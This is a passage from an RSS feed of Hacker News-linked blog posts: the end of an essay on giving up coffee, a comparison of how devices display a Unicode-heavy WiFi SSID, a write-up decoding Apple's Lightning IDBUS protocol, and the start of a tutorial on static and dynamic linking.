<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/06/30/coffee.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708204</guid>
            <pubDate>Wed, 01 Jul 2020 23:44:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”]]>
            </title>
            <description>
<![CDATA[
Score 230 | Comments 57 (<a href="https://news.ycombinator.com/item?id=23708056">thread link</a>) | @herohamp
<br/>
July 1, 2020 | https://hamptonmoore.com/posts/weird-wifi-name-display/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-name-display/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-name-display/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708056</guid>
            <pubDate>Wed, 01 Jul 2020 23:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Lightning]]>
            </title>
            <description>
<![CDATA[
Score 573 | Comments 224 (<a href="https://news.ycombinator.com/item?id=23705546">thread link</a>) | @captn3m0
<br/>
July 1, 2020 | https://nyansatan.github.io/lightning/ | <a href="https://web.archive.org/web/*/https://nyansatan.github.io/lightning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>
                            <th></th>
                            <th colspan="3">Meaningful</th>
                            <th colspan="2">Recovery</th>
                        </tr>
                        <tr>
                            <th>Word</th>
                            <th>Min</th>
                            <th>Typ</th>
                            <th>Max</th>
                            <th>Min</th>
                            <th>Typ</th>
                        </tr>
                        <tr>
                            <td><b>BREAK</b></td>
                            <td>12</td>
                            <td>14</td>
                            <td>16</td>
                            <td>2.5</td>
                            <td>4.5</td>
                        </tr>
                        <tr>
                            <td><b>WAKE</b></td>
                            <td>22</td>
                            <td>24</td>
                            <td>27</td>
                            <td></td>
                            <td>1100?</td>
                        </tr>
                        <tr>
                            <td><b>ZERO</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>3</td>
                        </tr>
                        <tr>
                            <td><b>ONE</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>8.5</td>
                        </tr>
                        <tr>
                            <td><b>ZERO with STOP*</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>16</td>
                        </tr>
                        <tr>
                            <td><b>ONE with STOP*</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                    </tbody></table>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>
                    <p>

                    Using the tables above let's decode our cable's ID (<span>10 0C 00 00 00 00</span>) with keeping in mind that ID line was found on ID0 pin:<br>

                    h
                    </p><table>
                        <caption>First byte of the cable's 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                        <tr>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>1</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                        </tr></tbody></table>
    
                    <p>

                    So, ACCx is <span>00</span> meaning that ID0 pin will just stick with IDBUS, and Dx is <span>01</span> meaning that DP1/DN1 pins will be configured as USB0_DP/USB0_DN. Just …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nyansatan.github.io/lightning/">https://nyansatan.github.io/lightning/</a></em></p>]]>
            </description>
            <link>https://nyansatan.github.io/lightning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705546</guid>
            <pubDate>Wed, 01 Jul 2020 19:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Linking]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23704160">thread link</a>) | @azhenley
<br/>
July 1, 2020 | https://blog.stephenmarz.com/2020/06/22/dynamic-linking/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#linking">What is Linking</a></li><li><a href="#finding">Finding Symbols</a></li><li><a href="#static">Static Libraries (archives)</a></li><li><a href="#dynamic">Dynamic Libraries (shared objects)</a></li><li><a href="#analyze">Analyzing a Shared Program</a></li><li><a href="#unresolved">Unresolved Symbols at Run Time</a></li><li><a href="#plt">Procedure Linkage Table (plt)</a></li><li><a href="#got">Global Offset Table (got)</a></li><li><a href="#updating-got">Loading and Updating the GOT</a></li><li><a href="#conclusion">Conclusion and Further Reading</a></li><li><a href="#video">Video</a></li></ol>



<hr>



<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>



